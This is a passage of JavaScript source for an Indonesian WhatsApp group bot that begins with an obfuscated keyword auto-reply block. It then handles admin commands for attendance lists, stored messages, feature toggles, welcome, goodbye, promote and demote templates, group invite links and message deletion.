bodynya=m[_0x314312(0x30,0xca,0x67,0x7d,0x1b)]==_0x15bd51(0xd2,0x11c,0x10d,0xf5,0xe8)+_0x314312(0x7f,0x5b,0x4d,0x4b,0x81)+_0x15bd51(0xc1,0xf9,0x75,0xb8,0x58)+_0x34ac6b(-0x131,-0xbc,-0x13b,-0x105,-0x116)?m[_0x314312(-0x27,-0x52,-0x43,-0x8,-0x15)+'ge'][_0x314312(0x87,0xb6,0x69,0x4e,0x7f)+_0x919e99(0x3d5,0x44c,0x43b,0x43d,0x421)+_0x5e2797(0x3d4,0x437,0x3f4,0x3e4,0x48c)+_0x314312(-0x80,-0x6c,-0x3b,-0x91,-0x4)][_0x34ac6b(-0x112,-0xcc,-0x5e,-0xc0,-0x84)+_0x5e2797(0x42e,0x469,0x447,0x4c0,0x4cf)+_0x15bd51(0x99,0x8e,0xaf,0xcc,0xdf)+'ly'][_0x34ac6b(-0xa3,-0x7c,-0xec,-0xdb,-0xe7)+_0x919e99(0x444,0x3ba,0x401,0x466,0x447)+_0x919e99(0x35e,0x3f8,0x3b6,0x3f0,0x39d)]:m[_0x919e99(0x4b5,0x413,0x455,0x436,0x464)]==_0x314312(-0xc,-0xd,-0x43,-0x3a,-0x38)+_0x314312(-0x7b,-0x19,-0x51,-0x7f,-0x61)+_0x15bd51(0xcb,0x52,0xa9,0x98,0xee)+_0x314312(0x40,0x5d,0x9,0x2f,0x15)?m[_0x15bd51(0x8c,0xe,0x8b,0x49,0x80)+'ge'][_0x15bd51(0xb3,0x24,0xc1,0x60,0x53)+_0x919e99(0x44b,0x472,0x43d,0x481,0x3e6)+_0x919e99(0x3ee,0x451,0x443,0x3f5,0x427)+_0x34ac6b(-0xdd,-0xba,-0x87,-0xa8,-0x84)+'ge']?.[_0x314312(-0x2c,-0x11,-0x11,0x51,-0x40)+_0x34ac6b(-0xe1,-0xbc,-0xae,-0xf0,-0xa4)+_0x15bd51(0x52,0x48,0xf1,0xac,0x105)+'d']||m[_0x34ac6b(-0x14a,-0x115,-0x13b,-0x10d,-0xd2)+'ge'][_0x15bd51(0xf6,0xef,0xbe,0xf5,0xe1)+_0x314312(0x14,0x62,0x4d,0x47,0x8b)+_0x919e99(0x3bb,0x3f7,0x41a,0x418,0x3ec)+_0x314312(-0x9b,-0x43,-0x3b,0x2,-0x90)]?.[_0x34ac6b(-0xc8,-0xae,-0x6e,-0xc0,-0xfd)+_0x34ac6b(-0x16,-0x3c,-0x24,-0x6c,-0x63)+_0x34ac6b(-0x66,-0xb9,-0x6e,-0x8a,-0x92)+'ly'][_0x34ac6b(-0x119,-0xe2,-0x11b,-0xdb,-0xe5)+_0x314312(-0x3e,0x7,0x13,0x1c,-0x14)+_0x919e99(0x394,0x3ac,0x3b6,0x3cd,0x369)]||m[_0x34ac6b(-0x8d,-0xb6,-0x95,-0xe6,-0xc6)]:'';if(m[_0x15bd51(0x6,0x27,0xc1,0x64,0x83)+'up']&&m[_0x919e99(0x3cf,0x351,0x3ab,0x38e,0x393)+'ge']&&data_store['id']===m[_0x34ac6b(-0x3f,-0x2f,-0x52,-0x66,-0x99)]&&bodynya[_0x15bd51(0xc9,0xb2,0x148,0xe5,0xfc)+_0x314312(0x6d,0x90,0x49,0x30,0x89)](data_store[_0x919e99(0x466,0x3ea,0x423,0x3d6,0x422)])){if(data_store[_0x919e99(0x3d4,0x431,0x3eb,0x42d,0x3bb)+'ge']===![]){const _0xcb0289={};_0xcb0289[_0x919e99(0x3c9,0x403,0x3d2,0x3a8,0x3ce)]=data_store[_0x314312(-0x2d,-0x26,-0x1f,-0x4,-0x31)+_0x15bd51(0x8c,0x13d,0xe7,0xec,0x110)],alpha[_0x314312(-0xd,-0x4c,-0x7,-0x2b,-0x4a)+_0x314312(-0x5,0x5c,0x48,0x4f,-0x1e)+'e'](m[_0x15bd51(0x13d,0x96,0xe5,0xf0,0xdc)],_0xcb0289,{'quoted':m});}else alpha[_0x919e99(0x3ea,0x3ad,0x3e7,0x38c,0x3d6)+_0x34ac6b(-0x1f,-0xbe,-0x42,-0x82,-0x27)+'e'](m[_0x34ac6b(-0x8f,-0x73,-0xc6,-0x66,-0x13)],{'image':await getBuffer(data_store[_0x314312(0x4b,0x95,0x3c,0x50,0x82)+_0x919e99(0x484,0x3f2,0x426,0x3d7,0x408)]),'caption':data_store[_0x5e2797(0x405,0x3ec,0x449,0x437,0x3d0)+_0x34ac6b(-0x7a,-0xb2,-0xa7,-0x6a,-0x6f)]},{'quoted':m});}}}catch(_0x4b75cb){console[_0x919e99(0x420,0x3d1,0x3e2,0x444,0x40e)](_0x4b75cb);}if(m[_0x314312(0x1c,0x25,-0x28,0x2e,0x0)+'up']&&db[_0x15bd51(0xa3,0xe1,0x116,0xc3,0xde)][_0x919e99(0x43b,0x450,0x408,0x40f,0x40f)][m[_0x15bd51(0x114,0xff,0x137,0xf0,0x11f)]][_0x34ac6b(-0x39,-0xa4,-0x6c,-0x87,-0x75)]&&!isGroupAdmins&&!isCreator)return;
      
        switch(command) {
        	case 'absen':
        if (m.isGroup) { 
  if (!(isGroupAdmins || isCreator))return reply(lang.adminOnly())
  } 
db.data.absen = db.data.absen || {} 
if (!(from in db.data.absen)) return alpha.send1ButMes(m.chat, lang.noAbsen() , `© ${ownername}`, `.absenstart`, lang.StartAbsen(), m)

let absen = db.data.absen[from][1] 
const wasVote = absen.includes(m.sender) 
if (wasVote)return reply(lang.DahAbsen())
absen.push(m.sender) 
let d = new Date 
let date = d.toLocaleDateString('id', { 
  day: 'numeric', 
  month: 'long', 
  year: 'numeric' 
}) 
let list = absen.map((v, i) => `• ${i + 1}. @${v.split`@`[0]}`).join('\n') 
let caption = `Tanggal: ${date}
${db.data.absen[from][2] ? db.data.absen[from][2] + '\n' : ''}
*--------「 LIST ABSEN 」--------*
${list}

Total: ${absen.length}
`.trim()
await alpha.send2ButMes(m.chat, caption, `© ${ownername}`, `.absen`, `Absen`, `.cekabsen`, `Check Absen`, m, absen)

//alpha.sendTextWithMentions(m.chat, caption, m)
break
case 'cekabsen':{
	if (m.isGroup) { 
  if (!(isGroupAdmins || isCreator))return reply(lang.adminOnly())
  } 
db.data.absen = db.data.absen || {}
if (!(from in db.data.absen))return alpha.send1ButMes(m.chat, lang.noAbsen(), `© ${ownername}`, `.absenstart`, lang.StartAbsen(), m)

let dd = new Date 
let datee = dd.toLocaleDateString('id', { 
  day: 'numeric', 
  month: 'long', 
  year: 'numeric' 
}) 
let absenn = db.data.absen[from][1] 
let listt = absenn.map((v, i) => `• ${i + 1}. @${v.split`@`[0]}`).join('\n') 
let captionn = `Tanggal: ${datee}
${db.data.absen[from][2] ? db.data.absen[from][2] + '\n' : ''}
*--------「 LIST ABSEN 」--------*
${listt}

Total: ${absenn.length}
`.trim()
alpha.send2ButMes(m.chat, captionn, `© ${ownername}`, `.absen`, `Absen`, `.deleteabsen`, `Delete Absen`, m, absenn)

//alpha.sendTextWithMentions(m.chat, captionn, m)
}
break

case 'delabsen': case 'deleteabsen':{
if (m.isGroup) { 
  if (!(isGroupAdmins || isCreator))return reply(lang.adminOnly())
  } 
  db.data.absen = db.data.absen || {}
  if (!(from in db.data.absen))return alpha.send1ButMes(m.chat, lang.noAbsen(), `© ${ownername}`, `.absenstart`, lang.StartAbsen(), m)

  delete db.data.absen[from]
reply(lang.DelAbsen())
}
break
case 'absenstart': case 'mulaiabsen':{
if (m.isGroup) { 
  if (!(isGroupAdmins || isCreator))return reply(lang.adminOnly())
} 
db.data.absen = db.data.absen || {}
if (from in db.data.absen)return alpha.send2ButMes(m.chat, lang.adaAbsen(), `© ${ownername}`, `.cekabsen`, `Check Absen`, `.deleteabsen`, `Delete Absen`, m)

db.data.absen[from] = [
  await alpha.send1ButMes(m.chat, lang.SAbsen(), `© ${ownername}`, `.absen`, `Absen`, m),

  [], q ? q : '']
  }
break
        	//Database
case 'setcmd': {
db.data.cmd = db.data.cmd || {}
if (!m.quoted)return reply(lang.SetCmd(prefix, command))
if (!m.quoted.fileSha256)return reply(lang.HashCmd())
if (!text)return reply(lang.CmdApa())
let sticker = db.data.cmd
let hash = m.quoted.fileSha256.toString('base64')
if (sticker[hash] && sticker[hash].locked) return reply(lang.UCmd())
sticker[hash] = {
q,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
reply(`Done!`)
}
break
case 'deletecmd': case 'delcmd': {
let hash = m.quoted.fileSha256.toString('base64')
if (!hash)return reply(lang.HashCmd())
let sticker = db.data.cmd
if (sticker[hash] && sticker[hash].locked)return reply(lang.UCmd())
delete sticker[hash]
reply(lang.DelCmd())
}
break
case 'listcmd': {
let teks = `
*List Hash*
Info: *bold* hash is Locked

*Hash :*
 ${Object.entries(db.data.cmd).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} 
*Command: ${value.q}*
*Creator : @${value.creator.split("@")[0]}*
*Create Time : ${moment(value.at * 1).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}*
*Locked : ${value.locked}*
`).join('\n')}
`.trim()
alpha.sendTextWithMentions(m.chat, teks, m)
}
break
case 'lockcmd': {
if (!isCreator)return reply(lang.ownerOnly())
if (!m.quoted)return reply(lang.LockCmd())
if (!m.quoted.fileSha256)return reply(lang.HashCmd())
let sticker = db.data.cmd
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in sticker))return reply(lang.NoCmd())
sticker[hash].locked = !/^un/i.test(command)
reply(lang.ok())
}
break
            case 'addmsg': {
                if (!m.quoted) return reply(lang.ReplyMsg())
                if (!text) return reply(lang.NoMsg(prefix, command))
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
                if (text.toLowerCase() in msgs) return reply(lang.AdMsg(text))
                msgs[text.toLowerCase()] = quoted.fakeObj
                fs.writeFileSync('./database/database.json', JSON.stringify(msgs))
reply(lang.DoneMsg(prefix, text))
            }
            break
            case 'getmsg': {
                if (!text) reply(lang.GetMsg(prefix, command))
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
                if (!(text.toLowerCase() in msgs)) return reply(lang.NoInMsg(text))
                alpha.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(msgs).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${Object.keys(i.message)[0]}\n────────────────────────\n\n`
	        }
	        reply(teks)
	    }
	    break
		case 'delmsg': case 'deletemsg': {
	        let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        if (!(text.toLowerCase() in msgs)) return reply(lang.NoInMsg(text))
		delete msgs[text.toLowerCase()]
                fs.writeFileSync('./database/database.json', JSON.stringify(msgs))
		reply(lang.DelMsg(text))
            }
	    break
	
	case 'antiviewonce': case 'antionce':
        if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
        if (args[0] === "on") {
      	if (db.data.chats[m.chat].antionce) return reply(lang.OnBef())
        db.data.chats[m.chat].antionce = true
        reply(lang.OkOn(command))
        } else if (args[0] === "off") {
        	if (!db.data.chats[m.chat].antionce) return reply(lang.OffYaBef())
        db.data.chats[m.chat].antionce = false
        reply(lang.OffBef())
        } else {
        	alpha.sendButMessage(from, 'Mode Anti View Once', `© ${ownername}`, [{buttonId: '.antionce on', buttonText: {displayText: 'ON'}, type: 1},{buttonId: '.antionce off', buttonText: {displayText: 'OFF'}, type: 1}], {quoted: fgif})
			}
			break
		case 'autoblok': case 'autoblok212': {
        if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
        if (args[0] === "on") {
        if (db.data.settings[botNumber].autoblok === true) return reply(lang.OnBef())
        db.data.settings[botNumber].autoblok = true
        reply(lang.OkOn(command))
        } else if (args[0] === "off") {
        	if (db.data.settings[botNumber].autoblok === false) return reply(lang.OffYaBef())
        db.data.settings[botNumber].autoblok = false
        reply(lang.OffBef('Autoblok'))
        } else {
        	alpha.sendButMessage(m.chat, 'Mode Autoblok', `© ${ownername}`, [{buttonId: '.autoblok on', buttonText: {displayText: 'ON'}, type: 1},{buttonId: '.autoblok off', buttonText: {displayText: 'OFF'}, type: 1}], {quoted: fgif})
			}}
			break
		case 'autobio': {
        if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
        if (args[0] === "on") {
      	if (db.data.settings[botNumber].autobio === true) return reply(lang.OnBef())
        db.data.settings[botNumber].autobio = true
        reply(lang.OkOn(command))
        } else if (args[0] === "off") {
        	if (db.data.settings[botNumber].autobio === false) return reply(lang.OffYaBef())
        db.data.settings[botNumber].autobio = false
        reply(lang.OffBef('Autobio'))
        } else {
        	alpha.sendButMessage(m.chat, 'Mode Autobio', `© ${ownername}`, [{buttonId: '.autobio on', buttonText: {displayText: 'ON'}, type: 1},{buttonId: '.autobio off', buttonText: {displayText: 'OFF'}, type: 1}], {quoted: fgif})
			}}
			break
			case 'autorespond': case 'autorespon': {
        if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
        if (args[0] === "on") {
      	if (db.data.settings[botNumber].autorespond) return reply(lang.OnBef())
        db.data.settings[botNumber].autorespond = true
        reply(lang.OkOn(command))
        } else if (args[0] === "off") {
        	if (!db.data.settings[botNumber].autorespond) return reply(lang.OffBef())
        db.data.settings[botNumber].autorespond = false
        reply(lang.OffBef('Auto Respond'))
        } else {
        	alpha.sendButMessage(m.chat, 'Mode Auto Respond', `© ${ownername}`, [{buttonId: '.autorespond on', buttonText: {displayText: 'ON'}, type: 1},{buttonId: '.autorespond off', buttonText: {displayText: 'OFF'}, type: 1}], {quoted: fgif})
			}}
			break
			case 'autoread':{
        if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
        if (args[0] === "on") {
      	if (db.data.settings[botNumber].autoread) return reply(lang.OnBef())
        db.data.settings[botNumber].autoread = true
        reply(lang.OkOn(command))
        } else if (args[0] === "off") {
        	if (!db.data.settings[botNumber].autoread) return reply(lang.OffBef())
        db.data.settings[botNumber].autoread = false
        reply(lang.OffBef('Auto Read'))
        } else {
        	alpha.sendButMessage(m.chat, 'Mode Auto Read', `© ${ownername}`, [{buttonId: '.autoread on', buttonText: {displayText: 'ON'}, type: 1},{buttonId: '.autoread off', buttonText: {displayText: 'OFF'}, type: 1}], {quoted: fgif})
			}}
			break
case 'unbanchats': case 'unbanchat':
if (!m.isGroup) return reply(lang.groupOnly())
if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
if (!db.data.chats[m.chat].mute) return reply(lang.NoMute())
        db.data.chats[m.chat].mute = false
        reply(lang.OkUnBanC())
break
case 'banchat': case 'banchats': case 'mute':
if (!m.isGroup) return reply(lang.groupOnly())
         if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
        if (args[0] === "on") {
		if (db.data.chats[m.chat].mute) return reply(lang.OnBef())
        db.data.chats[m.chat].mute = true
        reply(lang.OkMute())
        } else if (args[0] === "off") {
		if (!db.data.chats[m.chat].mute) return reply(lang.OffYaBef())
        db.data.chats[m.chat].mute = false
        reply(lang.OkUnMute())
        } else {
        	alpha.sendButMessage(from, 'Mode Mute', `© ${ownername}`, [{buttonId: '.mute on', buttonText: {displayText: 'ON'}, type: 1},{buttonId: '.mute off', buttonText: {displayText: 'OFF'}, type: 1}], {quoted: fgif})
			}
			break
        	case 'nsfw':
        if (!isGroupAdmins && !isGroupOwner && !m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
        if (args[0] === "on") {
		if (db.data.chats[m.chat].nsfw) return reply(lang.OnBef())
        db.data.chats[m.chat].nsfw = true
        reply(lang.OkOn('Nsfw'))
        } else if (args[0] === "off") {
        	if (!db.data.chats[m.chat].nsfw) return reply(lang.OffYaBef())
        db.data.chats[m.chat].nsfw = false
        reply(lang.OffBef('Nsfw'))
        } else {
        	alpha.sendButMessage(from, 'Mode Nfsw', `© ${ownername}`, [{buttonId: '.nsfw on', buttonText: {displayText: 'ON'}, type: 1},{buttonId: '.nsfw off', buttonText: {displayText: 'OFF'}, type: 1}], {quoted: fgif})
			}
			break
			case 'antilink':
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			if (!isBotAdmins) return reply(lang.botNotAdmin())
			if (args[0] === "on") {
				if (db.data.chats[m.chat].antilink) return reply(lang.OnBef())
				db.data.chats[m.chat].antilink = true
				reply(lang.OkOn('Antilink'))
				} else if (args[0] === "off") {
					if (!db.data.chats[m.chat].antilink) return reply(lang.OffYaBef())
					db.data.chats[m.chat].antilink = false
					reply(lang.OffBef('Antilink'))
					} else {
						alpha.sendButMessage(from, 'Mode Antilink', `© ${ownername}`, [{buttonId: '.antilink on', buttonText: {displayText: 'ON'}, type: 1},{buttonId: '.antilink off', buttonText: {displayText: 'OFF'}, type: 1}], {quoted: fgif})
						}
					break     
			case 'detectpromote': case 'promotedetect':
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			if (!isBotAdmins) return reply(lang.botNotAdmin())
			if (args[0] === "on") {
				if (db.data.chats[m.chat].promote) return reply(lang.OnBef())
				db.data.chats[m.chat].promote = true
				reply(lang.OkOn('Detect Promote'))
				} else if (args[0] === "off") {
					if (!db.data.chats[m.chat].promote) return reply(lang.OffYaBef())
					db.data.chats[m.chat].promote = false
					reply(lang.OffBef('Detect Promote'))
					} else {
						alpha.sendButMessage(from, 'Mode Detect Promote', `© ${ownername}`, [{buttonId: '.detectpromote on', buttonText: {displayText: 'ON'}, type: 1},{buttonId: '.detectpromote off', buttonText: {displayText: 'OFF'}, type: 1}], {quoted: fgif})
						}
					break     
			case 'detectdemote': case 'demotedetect':
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			if (!isBotAdmins) return reply(lang.botNotAdmin())
			if (args[0] === "on") {
				if (db.data.chats[m.chat].demote) return reply(lang.OnBef())
				db.data.chats[m.chat].demote = true
				reply(lang.OkOn('Detect Demote'))
				} else if (args[0] === "off") {
					if (!db.data.chats[m.chat].demote) return reply(lang.OffYaBef())
					db.data.chats[m.chat].demote = false
					reply(lang.OffBef('Detect Demote'))
					} else {
						alpha.sendButMessage(from, 'Mode Detect Promote', `© ${ownername}`, [{buttonId: '.detectdemote on', buttonText: {displayText: 'ON'}, type: 1},{buttonId: '.detectdemote off', buttonText: {displayText: 'OFF'}, type: 1}], {quoted: fgif})
						}
					break     
			case 'updatewelcome': case 'setwelcome':{
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			if(!text) return reply(`Contoh penggunaan: ${prefix + command} Welcome @user\n\n- @user (Tag user)\n- @number (Nomor user)\n- @group (Nama group)\n- @bio (Bio user)\n- @members (Total member)\n- @day (Hari)\n- @date (Tanggal)\n- @time (Jam)\n- @desc (Deskripsi group)`)
			db.data.chats[m.chat].setWelcome = text
			alpha.sendButMessage(m.chat, lang.ok() + ' ' + command + '\n\n' + text, `© ${ownername}`, [{buttonId: '.cekwelcome', buttonText: {displayText: 'Check Welcome'}, type: 1}], {quoted: fgif})
			}
			break
			case 'updatepromote': case 'setpromote':{
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			if(!text) return reply(`Contoh penggunaan: ${prefix + command} Promote @user\n\n- @user (Tag user)\n- @number (Nomor user)\n- @group (Nama group)\n- @bio (Bio user)\n- @members (Total member)\n- @day (Hari)\n- @date (Tanggal)\n- @time (Jam)\n- @desc (Deskripsi group)`)
			db.data.chats[m.chat].setPromote = text
			alpha.sendButMessage(m.chat, lang.ok() + ' ' + command + '\n\n' + text, `© ${ownername}`, [{buttonId: '.cekpromote', buttonText: {displayText: 'Check Promote'}, type: 1}], {quoted: fgif})
			}
			break
			case 'updatedemote': case 'setdemote':{
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			if(!text) return reply(`Contoh penggunaan: ${prefix + command} Demote @user\n\n- @user (Tag user)\n- @number (Nomor user)\n- @group (Nama group)\n- @bio (Bio user)\n- @members (Total member)\n- @day (Hari)\n- @date (Tanggal)\n- @time (Jam)\n- @desc (Deskripsi group)`)
			db.data.chats[m.chat].setDemote = text
			alpha.sendButMessage(m.chat, lang.ok() + ' ' + command + '\n\n' + text, `© ${ownername}`, [{buttonId: '.cekdemote', buttonText: {displayText: 'Check Demote'}, type: 1}], {quoted: fgif})
			}
					break  
			case 'updateproses': case 'setproses':{
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			if(!text) return reply(`Contoh penggunaan: ${prefix + command} Proses @user\n\n- @user (Tag user)\n- @tanggal (tanggal)\n- @jam (jam)\n- @catatan (catatan pesanan)`)
			db.data.chats[m.chat].setProses = text
			alpha.sendButMessage(m.chat, lang.ok() + ' ' + command + '\n\n' + text, `© ${ownername}`, [{buttonId: '.cekpromote', buttonText: {displayText: 'Check Proses'}, type: 1}], {quoted: fgif})
			}
			break
			case 'updatedone': case 'setdone':{
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			if(!text) return reply(`Contoh penggunaan: ${prefix + command} Done @user\n\n- @user (Tag user)\n- @tanggal (tanggal)\n- @jam (jam)\n- @catatan (catatan pesanan)`)
			db.data.chats[m.chat].setDone = text
			alpha.sendButMessage(m.chat, lang.ok() + ' ' + command + '\n\n' + text, `© ${ownername}`, [{buttonId: '.cekdone', buttonText: {displayText: 'Check Done'}, type: 1}], {quoted: fgif})
			}
					break  
			case 'cekproses':{
				if (!m.isGroup) return reply(lang.groupOnly())
				defaultwel = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM     : @jam\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan :\n@catatan\n\nPesanan @user sedang di proses!`
				textwel = (db.data.chats[m.chat].setProses || defaultwel)
				reply('Text proses in group ' + groupName + `\n\n` + textwel)
				}
				break  
			case 'cekdone':{
				if (!m.isGroup) return reply(lang.groupOnly())
				defaultwel = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM     : @jam\n✨ STATUS  : Berhasil\`\`\`\n\n📝 Catatan :\n@catatan\n\nTerimakasih @user Next Order ya🙏`
				textwel = (db.data.chats[m.chat].setDone || defaultwel)
				reply('Text done in group ' + groupName + `\n\n` + textwel)
				}
				break
			case 'deldone':{
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			db.data.chats[m.chat].setDone = ''
			alpha.sendButMessage(m.chat, lang.ok(), `© ${ownername}`, [{buttonId: '.cekdone', buttonText: {displayText: 'Check Done'}, type: 1}], {quoted: fgif})
			}
					break                   
				case 'delproses':{
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			db.data.chats[m.chat].setProses = ''
			alpha.sendButMessage(m.chat, lang.ok(), `© ${ownername}`, [{buttonId: '.cekproses', buttonText: {displayText: 'Check Proses'}, type: 1}], {quoted: fgif})
			}
					break     
			case 'delpromote':{
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			db.data.chats[m.chat].setPromote = ''
			alpha.sendButMessage(m.chat, lang.ok(), `© ${ownername}`, [{buttonId: '.cekpromote', buttonText: {displayText: 'Check Promote'}, type: 1}], {quoted: fgif})
			}
					break                   
				case 'deldemote':{
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			db.data.chats[m.chat].setDemote = ''
			alpha.sendButMessage(m.chat, lang.ok(), `© ${ownername}`, [{buttonId: '.cekdemote', buttonText: {displayText: 'Check Demote'}, type: 1}], {quoted: fgif})
			}
					break                                 
			case 'cekpromote':{
				if (!m.isGroup) return reply(lang.groupOnly())
				defaultwel = `@user Promote From @group`
				textwel = (db.data.chats[m.chat].setPromote || defaultwel)
				reply('Text promote in group ' + groupName + `\n\n` + textwel)
				}
				break  
			case 'cekdemote':{
				if (!m.isGroup) return reply(lang.groupOnly())
				defaultwel = `@user Demote From @group`
				textwel = (db.data.chats[m.chat].setDemote || defaultwel)
				reply('Text demote in group ' + groupName + `\n\n` + textwel)
				}
				break
			case 'cekwelcome':{
				if (!m.isGroup) return reply(lang.groupOnly())
				defaultwel = `*Welcome to @group*\n\n📛 : _@user_\n🔢 : _@number_\n💌 : _@bio_\n🏅 : _@members Members_\n📆 : _@day, @date_\n⏰ : _@time Asia/Jakarta_`
				textwel = (db.data.chats[m.chat].setWelcome || defaultwel)
				reply('Text welcome in group ' + groupName + `\n\n` + textwel)
				}
				break
			case 'cekleft': case 'cekgoodbye':{
				if (!m.isGroup) return reply(lang.groupOnly())
				defaultwel = `◪ Goodbye @user\n◪ Leave from group: \n@group\n\n└─ ❏ Nomor: @number\nGoodBye~~`
				textwel = (db.data.chats[m.chat].setLeave || defaultwel)
				reply('Text googbye in group ' + groupName + `\n\n` + textwel)
				}
				break     
			case 'delgoodbye':{
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			db.data.chats[m.chat].setLeave = ''
			alpha.sendButMessage(m.chat, lang.ok(), `© ${ownername}`, [{buttonId: '.cekleft', buttonText: {displayText: 'Check Welcome'}, type: 1}], {quoted: fgif})
			}
					break                   
				case 'delwelcome':{
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			db.data.chats[m.chat].setWelcome = ''
			alpha.sendButMessage(m.chat, lang.ok(), `© ${ownername}`, [{buttonId: '.cekwelcome', buttonText: {displayText: 'Check Welcome'}, type: 1}], {quoted: fgif})
			}
					break                   
			case 'updategoodbye': case 'setgoodbye': case 'setleft': case 'setleave':{
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			if(!text) return reply(`Contoh penggunaan: ${prefix + command} Goodbye @user\n\n- @user (Tag user)\n- @number (Nomor user)\n- @group (Nama group)\n- @bio (Bio user)\n- @members (Total member)\n- @day (Hari)\n- @date (Tanggal)\n- @time (Jam)\n- @desc (Deskripsi group)`)
			db.data.chats[m.chat].setLeave = text
			alpha.sendButMessage(m.chat, lang.ok() + '\n' + text, `© ${ownername}`, [{buttonId: '.cekleft', buttonText: {displayText: 'Check Welcome'}, type: 1}], {quoted: fgif})
			
			}
					break               
			case 'welcome':
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			if (args[0] === "on") {
				if (db.data.chats[m.chat].welcome) return reply(lang.OnBef())
				db.data.chats[m.chat].welcome = true
				reply(lang.OkOn('Welcome'))
				} else if (args[0] === "off") {
					if (!db.data.chats[m.chat].welcome) return reply(lang.OffYaBef())
					db.data.chats[m.chat].welcome = false
					reply(lang.OffBef('Welcome'))
					} else {
						alpha.sendButMessage(from, 'Mode Welcome Msg', `© ${ownername}`, [{buttonId: '.welcome on', buttonText: {displayText: 'ON'}, type: 1},{buttonId: '.welcome off', buttonText: {displayText: 'OFF'}, type: 1}], {quoted: fgif})
						}
					break          
			case 'goodbye': case 'left':
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			if (args[0] === "on") {
				if (db.data.chats[m.chat].goodbye) return reply(lang.OnBef())
				db.data.chats[m.chat].goodbye = true
				reply(lang.OkOn('Goodbye'))
				} else if (args[0] === "off") {
					if (!db.data.chats[m.chat].goodbye) return reply(lang.OffYaBef())
					db.data.chats[m.chat].goodbye = false
					reply(lang.OffBef('Goodbye'))
					} else {
						alpha.sendButMessage(from, 'Mode Goodbye Msg', `© ${ownername}`, [{buttonId: '.left on', buttonText: {displayText: 'ON'}, type: 1},{buttonId: '.left off', buttonText: {displayText: 'OFF'}, type: 1}], {quoted: fgif})
						}
					break          
            case 'linkgroup': case 'linkgrup': case 'linkgc': {
                if (!m.isGroup) return reply(lang.groupOnly())
                let response = await alpha.groupInviteCode(m.chat)
                alpha.sendText(m.chat, `Link Group : *${groupMetadata.subject}*\nhttps://chat.whatsapp.com/${response}`, m, { detectLink: true })
            }
            break
            case 'd': case 'delete': case 'del': {
            	if (!m.isGroup){
            	if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
                if (!m.quoted) throw false
				let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return reply(lang.NoMsgBot())
                alpha.sendMessage(m.chat, { delete: { remoteJid: m.chat, id: m.quoted.id, participant: m.quoted.sender } })
                } else {
                	if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
                if (!isBotAdmins) return reply(lang.botNotAdmin())
                if (!m.quoted) throw false
				let { chat, fromMe, id, isBaileys } = m.quoted
                 alpha.sendMessage(m.chat, { delete: { remoteJid: m.chat, id: m.quoted.id, participant: m.quoted.sender } })
                	}
            }
            break
		case 'unreg': case 'unregister':{
